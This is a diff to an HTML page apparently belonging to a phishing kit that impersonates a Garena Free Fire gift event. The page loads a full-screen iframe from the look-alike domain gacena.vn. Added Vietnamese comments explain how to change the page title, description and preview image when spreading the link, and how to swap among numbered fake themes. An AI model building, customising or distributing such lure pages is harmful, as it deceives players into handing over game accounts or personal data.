@@ -122,13 +122,13 @@ div#garena {
     padding: 1rem;
 }
     </style>
-        <title>Nhận quà garena free fire</title>
+        <title>Nhận quà garena free fire</title><!-- 	  đổi tiêu đề trang -->
     <meta content='Free fire' property='og:site_name'/>
 <meta content='https://garena.rest/x0s1MSLMLv.html' property='og:url'/>
 <meta content='website' property='og:type'/>
-<meta content='Sự kiện nhận quà free fire hot nhất 2021' property='og:description'/>
-<meta content='Nhận quà garena free fire' property='og:title'/>
-<meta content='https://garena.rest/demo/1.jpg' property='og:image'/>
+<meta content='Sự kiện nhận quà free fire hot nhất 2021' property='og:description'/>   <!--  đổi mô tả khi rải link -->
+<meta content='Nhận quà garena free fire' property='og:title'/>        <!--  đổi tiêu đề khi rải link -->
+<meta content='https://garena.rest/demo/1.jpg' property='og:image'/>  <!--  đổi ảnh mô tả khi rải link -->
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
   </head>
  <body>
@@ -335,8 +335,9 @@ div#garena {
   <!--đổi giao diện ở đây-->
   <!--đổi giao diện ở đây-->
  <!--đổi giao diện ở đây-->
-   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://gacena.vn/theme/9.html" id="iframe"> </iframe> 
-<!--https://ff-membership.glitch.me giao diện membership-->
+   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://gacena.vn/theme/11.html" id="iframe"> </iframe> 
+											<!-- https://gacena.vn/theme/  thay các chữ số từ 1 - 15 để đổi giao giện nha   .html -->
+	 <!--https://ff-membership.glitch.me giao diện membership-->
 
 
 
